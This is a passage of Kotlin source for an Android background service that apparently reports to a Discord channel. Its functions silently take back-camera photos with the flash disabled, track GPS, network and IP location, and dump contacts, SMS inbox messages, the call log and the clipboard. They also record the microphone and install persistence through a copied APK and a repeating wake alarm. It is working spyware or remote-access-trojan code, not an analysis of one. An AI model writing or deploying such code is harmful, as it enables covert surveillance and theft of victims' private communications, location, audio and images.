                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "camera2 find: ${e.message}")
            null
        }

        if (camId == null) {
            deferred.complete(null)
            return@withContext deferred.await()
        }

        var reader: ImageReader? = null
        var camDevice: CameraDevice? = null
        var session: CameraCaptureSession? = null

        try {
            val characteristics = cm.getCameraCharacteristics(camId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                ?: android.util.Size(1920, 1080)

            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            val handler = Handler(Looper.getMainLooper())

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    camDevice = device
                    try {
                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader!!.surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                        }.build()

                        device.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s
                                try {
                                    s.capture(captureRequest, null, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "camera2 capture: ${e.message}")
                                    deferred.complete(null)
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                deferred.complete(null)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "camera2 session: ${e.message}")
                        deferred.complete(null)
                    }
                }
                override fun onDisconnected(device: CameraDevice) { deferred.complete(null) }
                override fun onError(device: CameraDevice, error: Int) { deferred.complete(null) }
            }

            cm.openCamera(camId, stateCallback, handler)

            reader!!.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        deferred.complete(bytes)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "camera2 read: ${e.message}")
                    deferred.complete(null)
                }
            }, handler)

            withTimeoutOrNull(15000L) { deferred.await() }
        } catch (e: Exception) {
            Log.e(TAG, "camera2: ${e.message}")
            null
        } finally {
            try { session?.close() } catch (_: Exception) {}
            try { camDevice?.close() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
        }
    }

    private fun getLocation(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var loc: Location? = null

        // Try GPS first, then network, then passive
        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
            try {
                loc = lm.getLastKnownLocation(provider)
                if (loc != null && System.currentTimeMillis() - loc.time < 300000) break
                loc = null
            } catch (_: Exception) {}
        }

        if (loc != null) {
            val lat = loc.latitude
            val lon = loc.longitude
            val acc = loc.accuracy
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
        }

        // Try to get fresh location with shorter timeout
        val latch = CountDownLatch(1)
        var newLoc: Location? = null
        @Suppress("DEPRECATION")
        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) { newLoc = location; latch.countDown() }
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        try {
            for (p in listOf(LocationManager.NETWORK_PROVIDER, LocationManager.GPS_PROVIDER)) {
                if (lm.isProviderEnabled(p)) {
                    lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
                    latch.await(8, TimeUnit.SECONDS)
                    if (newLoc != null) break
                }
            }
        } catch (_: Exception) {
        } finally {
            lm.removeUpdates(listener)
        }

        if (newLoc != null) {
            val lat = newLoc!!.latitude
            val lon = newLoc!!.longitude
            val acc = newLoc!!.accuracy
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
        }

        // Fallback: IP-based geolocation
        try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val json = org.json.JSONObject(body)
            if (json.optString("status") == "success") {
                val lat = json.getDouble("lat")
                val lon = json.getDouble("lon")
                val city = json.optString("city", "?")
                val country = json.optString("country", "?")
                return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nhttps://www.google.com/maps?q=$lat,$lon"
            }
        } catch (_: Exception) {}

        return ":x: No location available — ensure GPS/WiFi is on and try outside"
    }

    private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
        return try {
            val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
            cursor?.use { c ->
                buildString {
                    var count = 0
                    while (c.moveToNext() && count < 50) {
                        appendLine(transform(c))
                        count++
                    }
                }
            } ?: "No data"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            cursor?.use { c ->
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
                    sb.appendLine(name)
                    count++
                }
            }
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
        return sb.toString().take(1900).ifEmpty { "No contacts" }
    }

    private fun getSms(): String = queryText(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date")
    ) { c ->
        val addr = c.getString(c.getColumnIndex("address")) ?: "?"
        val body = c.getString(c.getColumnIndex("body")) ?: ""
        "${addr}: ${body.take(120)}"
    }.take(1900).ifEmpty { "No SMS" }

    private fun getCallLog(): String = queryText(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE)
    ) { c ->
        val num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) ?: "?"
        val type = when (c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))) {
            CallLog.Calls.INCOMING_TYPE -> "IN"
            CallLog.Calls.OUTGOING_TYPE -> "OUT"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            else -> "?"
        }
        val dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION)) ?: "0"
        "$type $num (${dur}s)"
    }.take(1900).ifEmpty { "No call log" }

    private suspend fun recordAudio(seconds: Int): File? = withContext(Dispatchers.IO) {
        var recorder: MediaRecorder? = null
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            Log.e(TAG, "mic: ${e.message}")
            null
        } finally {
            try { recorder?.release() } catch (_: Exception) {}
        }
    }

    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString()
                if (text != null) text
                else "Non-text content (image/URI)"
            } else "Clipboard empty"
        } catch (e: SecurityException) {
            "Error: Android ${
                if (Build.VERSION.SDK_INT >= 34) "14+"
                else if (Build.VERSION.SDK_INT >= 33) "13"
                else if (Build.VERSION.SDK_INT >= 30) "11"
                else "?"
            } restricts clipboard access — only the app that put data or default IME can read"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun persistApk() {
        try {
            val src = File(applicationInfo.sourceDir)
            val dst = File(filesDir, "persist.apk")
            src.copyTo(dst, overwrite = true)
            val intent = Intent(this, MainService::class.java)
            val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
            Log.i(TAG, "Persist: ${dst.absolutePath} + alarm set")
        } catch (e: Exception) {
            Log.e(TAG, "persist: ${e.message}")
            throw e
        }
    }

    override fun onDestroy() {
        discord?.stop()
        discord = null
        scope.cancel()
        super.onDestroy()
    }
}
